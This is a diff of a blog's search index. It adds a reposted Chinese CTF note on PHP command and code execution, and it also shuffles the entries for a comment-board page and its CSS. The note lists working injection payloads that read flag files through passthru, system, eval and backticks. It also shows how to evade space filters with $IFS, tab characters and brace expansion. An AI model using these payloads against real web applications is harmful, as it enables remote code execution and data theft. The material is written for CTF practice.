@@ -4,6 +4,29 @@
   
     
     <entry>
+      <title>ctj笔记转载</title>
+      <link href="/2025/10/10/ctj%E7%AC%94%E8%AE%B0%E8%BD%AC%E8%BD%BD/"/>
+      <url>/2025/10/10/ctj%E7%AC%94%E8%AE%B0%E8%BD%AC%E8%BD%BD/</url>
+      
+        <content type="html"><![CDATA[<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><ul><li>语句<ul><li>system() <ul><li>执行外部程序(命令行)并返回命令输出的第一行为字符串.  </li><li>失败返回 false,如果没有找到命令返回空字符串.</li></ul></li><li>passthru() </li><li>与 system()不同，passthru()直接把命令执行的结果输出到标准输出,而不返回.  </li><li>shell_exec() <ul><li>返回输出第一行的内容,无回显.需要反弹 shell 使用.</li></ul></li><li>exec()<ul><li>不回显,返回命令执行的结果.</li></ul></li><li>&#96;&#96;<ul><li>在 php 中,反引号”&#96;”是可以执行系统命令的.  </li><li>反引号和 shell_exec()等价</li></ul></li></ul></li><li>命令执行<ul><li>解法<ul><li>解法1：passthru<ul><li>?c&#x3D;passthru(“tac%20fla*”);</li></ul></li></ul></li><li>解法2：绕过*号<ul><li>假如*号被过滤了，我们可以通过?c&#x3D;passthru(“ls”);</li><li>先获取flag.php是目标，然后再通过？来匹配单个字母，也就是fla?????匹配flag.php</li><li>?c&#x3D;passthru(“tac%20fla?????”);</li></ul></li><li>解法3：反字节符配合echo<ul><li>?c&#x3D;echo(<code>ls</code>);</li><li>?c&#x3D;echo%20<code>tac%20fla*</code>;</li></ul></li><li>解法4：带参数输入<ul><li>?c&#x3D;eval($_GET[1]);&amp;1&#x3D;system(“tac%20flag.php”)；</li><li>1参数逃逸，不属于c，可以使用被ban内容</li><li>web31</li></ul></li><li>解法5：exec<ul><li>echo%20exec(“cat%20f\lag.p\hp”);</li></ul></li><li>解法6：system<ul><li>?c&#x3D;system(“tac%20fla*”);</li></ul></li><li>解法7：利用cp或mv命令将flag拷贝到别处<ul><li>?c&#x3D;system(“cp%20fl*g.php%20a.txt%20”);</li><li>然后浏览器访问a.txt，读取即可</li><li>eg. web30</li></ul></li><li>解法8：万能<ul><li>?c&#x3D;echo highlight_file(next(array_reverse(scandir(pos(localeconv())))));</li><li>?c&#x3D;eval(array_pop(next(get_defined_vars())));</li></ul></li><li>如果;被ban，php代码最后一行可以不用; 然后换成?&gt;就行了</li><li>如果php被ban，可以用短标签</li></ul></li><li>对小数点的限制可以使用通配符*或者占位符？来绕过</li><li>preg_match是正则匹配</li><li>&#x2F;i : 忽略大小写</li><li>过滤空格，flag：cat$IFS<code>ls</code></li><li>绕过空格过滤：<ul><li>${IFS}$9</li><li>{IFS}</li><li>$IFS</li><li>${IFS}</li><li>IFS</li><li>&lt; </li><li>&lt;&gt; </li><li>{cat,flag.php}  &#x2F;&#x2F;用逗号实现了空格功能，需要用{}括起来</li><li>%09   (tab)</li><li>X&#x3D;$‘cat\x09.&#x2F;flag.php’;$X       （\x09表示tab，也可以用\x20）</li><li>&#x2F;?ip&#x3D;127.0.0.1;a&#x3D;g;cat$IFS$1fla$a.php</li></ul></li><li>windows 或 linux 下:<ul><li>command1 &amp;&amp; command2 先执行 command1，如果为真，再执行 command2</li><li>command1 | command2 只执行 command2</li><li>command1 &amp; command2 先执行 command2 后执行 command1</li><li>command1 || command2 先执行 command1，如果为假，再执行 command2</li><li>命令执行漏洞（| || &amp; &amp;&amp; 称为 管道符）</li></ul></li></ul><h3 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h3><ul><li>isset()<ul><li>函数返回一个布尔值，如果变量存在且不包含NULL值，则返回TRUE，否则返回FALSE。</li></ul></li><li>eval() <ul><li>代码执行函数,把输入的字符串当作 php 代码执行.  </li><li>可以 eval(?&gt;<?php [input]?>[text] &lt;?[p])，也就是用标签声明一段 php代码结束后再声明下一段代码开始</li><li>在函数输入的结尾需要打分号,否则会报 unexpected ending</li></ul></li><li>assert() <ul><li>断言函数 assert(),在 RCE 中可以简单的认为它等同于 eval()</li></ul></li><li>preg_match()<ul><li>如果找到一个匹配，preg_match() 函数返回 1，否则返回 0。</li></ul></li><li>preg_replace()  <ul><li>函数执行一个正则表达式的搜索和替换</li></ul></li><li>${}<ul><li>如果出现在字符串里就会被解析,并执行其中的 php 代码</li><li>${}本是用于在字符串中嵌入变量和执行表达式的</li></ul></li></ul>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> ctf </tag>
+            
+            <tag> 转载 </tag>
+            
+            <tag> 笔记 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>讲座笔记</title>
       <link href="/2025/10/09/%E8%AE%B2%E5%BA%A7%E7%AC%94%E8%AE%B0/"/>
       <url>/2025/10/09/%E8%AE%B2%E5%BA%A7%E7%AC%94%E8%AE%B0/</url>
@@ -16,9 +39,9 @@
             
             <tag> ctf </tag>
             
-            <tag> 电子取证 </tag>
-            
             <tag> 笔记 </tag>
+            
+            <tag> 电子取证 </tag>
             
         </tags>
       
@@ -364,11 +387,11 @@
     
     
     <entry>
-      <title>categories</title>
-      <link href="/categories/index.html"/>
-      <url>/categories/index.html</url>
+      <title></title>
+      <link href="/html/try.html"/>
+      <url>/html/try.html</url>
       
-        <content type="html"><![CDATA[]]></content>
+        <content type="html"><![CDATA[<!DOCTYPE html><html lang="zh-CN"><head>    <meta charset="UTF-8">    <meta name="viewport" content="width=device-width, initial-scale=1.0">    <title>留言板 - 弹幕互动</title>    <link rel="stylesheet" href="comments.css"></head><body>    <div class="container">        <div class="header">            <h1>💬 留言板 & 弹幕互动</h1>            <p>留下您的想法，参与实时弹幕互动</p>        </div>                <div class="content">            <!-- 留言板区域 -->            <div class="comments-section">                <div class="comment-form">                    <h3>发表留言</h3>                    <form id="commentForm">                        <div class="form-group">                            <label for="name">昵称</label>                            <input type="text" id="name" placeholder="请输入您的昵称" required>                        </div>                        <div class="form-group">                            <label for="email">邮箱</label>                            <input type="email" id="email" placeholder="请输入您的邮箱">                        </div>                        <div class="form-group">                            <label for="message">留言内容</label>                            <textarea id="message" rows="4" placeholder="请输入您的留言..." required></textarea>                        </div>                        <button type="submit" class="submit-btn">发布留言</button>                    </form>                </div>                                <div class="comments-list" id="commentsList">                    <!-- 留言列表将通过 JavaScript 动态生成 -->                </div>            </div>                        <!-- 弹幕区域 -->            <div class="danmaku-section">                <canvas id="danmakuCanvas"></canvas>                <div class="danmaku-controls">                    <div class="danmaku-input">                        <input type="text" id="danmakuInput" placeholder="输入弹幕内容..." maxlength="30">                        <button class="danmaku-send" onclick="sendDanmaku()">发射</button>                    </div>                </div>            </div>        </div>    </div>    <script src="comments.js"></script></body></html>]]></content>
       
     </entry>
     
@@ -380,17 +403,6 @@
       <url>/tags/index.html</url>
       
         <content type="html"><![CDATA[]]></content>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title></title>
-      <link href="/html/try.html"/>
-      <url>/html/try.html</url>
-      
-        <content type="html"><![CDATA[<!DOCTYPE html><html lang="zh-CN"><head>    <meta charset="UTF-8">    <meta name="viewport" content="width=device-width, initial-scale=1.0">    <title>留言板 - 弹幕互动</title>    <link rel="stylesheet" href="comments.css"></head><body>    <div class="container">        <div class="header">            <h1>💬 留言板 & 弹幕互动</h1>            <p>留下您的想法，参与实时弹幕互动</p>        </div>                <div class="content">            <!-- 留言板区域 -->            <div class="comments-section">                <div class="comment-form">                    <h3>发表留言</h3>                    <form id="commentForm">                        <div class="form-group">                            <label for="name">昵称</label>                            <input type="text" id="name" placeholder="请输入您的昵称" required>                        </div>                        <div class="form-group">                            <label for="email">邮箱</label>                            <input type="email" id="email" placeholder="请输入您的邮箱">                        </div>                        <div class="form-group">                            <label for="message">留言内容</label>                            <textarea id="message" rows="4" placeholder="请输入您的留言..." required></textarea>                        </div>                        <button type="submit" class="submit-btn">发布留言</button>                    </form>                </div>                                <div class="comments-list" id="commentsList">                    <!-- 留言列表将通过 JavaScript 动态生成 -->                </div>            </div>                        <!-- 弹幕区域 -->            <div class="danmaku-section">                <canvas id="danmakuCanvas"></canvas>                <div class="danmaku-controls">                    <div class="danmaku-input">                        <input type="text" id="danmakuInput" placeholder="输入弹幕内容..." maxlength="30">                        <button class="danmaku-send" onclick="sendDanmaku()">发射</button>                    </div>                </div>            </div>        </div>    </div>    <script src="comments.js"></script></body></html>]]></content>
       
     </entry>
     
@@ -424,6 +436,17 @@
       <url>/html/css/try.css</url>
       
         <content type="html"><![CDATA[* {    margin: 0;    padding: 0;    box-sizing: border-box;}body {    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);    min-height: 100vh;    padding: 20px;}.container {    max-width: 1200px;    margin: 0 auto;    background: rgba(255, 255, 255, 0.95);    border-radius: 20px;    overflow: hidden;    box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);}.header {    background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);    color: white;    padding: 40px;    text-align: center;}.header h1 {    font-size: 2.5rem;    margin-bottom: 10px;}.header p {    font-size: 1.2rem;    opacity: 0.9;}.content {    display: grid;    grid-template-columns: 1fr 1fr;    gap: 0;    min-height: 600px;}/* 留言板样式 */.comments-section {    padding: 30px;    background: white;    border-right: 1px solid #eee;}.comment-form {    background: #f8f9fa;    padding: 20px;    border-radius: 15px;    margin-bottom: 30px;}.form-group {    margin-bottom: 15px;}.form-group label {    display: block;    margin-bottom: 5px;    font-weight: 600;    color: #333;}.form-group input,.form-group textarea {    width: 100%;    padding: 12px;    border: 2px solid #e9ecef;    border-radius: 8px;    font-size: 14px;    transition: border-color 0.3s;}.form-group input:focus,.form-group textarea:focus {    outline: none;    border-color: #4facfe;}.submit-btn {    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);    color: white;    border: none;    padding: 12px 30px;    border-radius: 25px;    cursor: pointer;    font-size: 16px;    font-weight: 600;    transition: transform 0.3s;}.submit-btn:hover {    transform: translateY(-2px);}.comments-list {    max-height: 400px;    overflow-y: auto;}.comment-item {    background: white;    padding: 15px;    margin-bottom: 15px;    border-radius: 10px;    border-left: 4px solid #4facfe;    box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);}.comment-header {    display: flex;    justify-content: space-between;    align-items: center;    margin-bottom: 8px;}.comment-author {    font-weight: bold;    color: #333;}.comment-time {    color: #666;    font-size: 12px;}.comment-content {    color: #555;    line-height: 1.5;}/* 弹幕区域样式 */.danmaku-section {    position: relative;    background: #1a1a1a;    overflow: hidden;}#danmakuCanvas {    position: absolute;    top: 0;    left: 0;    width: 100%;    height: 100%;}.danmaku-controls {    position: absolute;    bottom: 20px;    left: 0;    right: 0;    padding: 0 20px;    z-index: 10;}.danmaku-input {    display: flex;    gap: 10px;}.danmaku-input input {    flex: 1;    padding: 12px;    border: none;    border-radius: 25px;    background: rgba(255, 255, 255, 0.9);}.danmaku-send {    background: #ff4757;    color: white;    border: none;    padding: 12px 20px;    border-radius: 25px;    cursor: pointer;    font-weight: 600;}/* 响应式设计 */@media (max-width: 768px) {    .content {        grid-template-columns: 1fr;    }        .comments-section {        border-right: none;        border-bottom: 1px solid #eee;    }        .header h1 {        font-size: 2rem;    }        .header {        padding: 30px 20px;    }}]]></content>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>categories</title>
+      <link href="/categories/index.html"/>
+      <url>/categories/index.html</url>
+      
+        <content type="html"><![CDATA[]]></content>
       
     </entry>
     
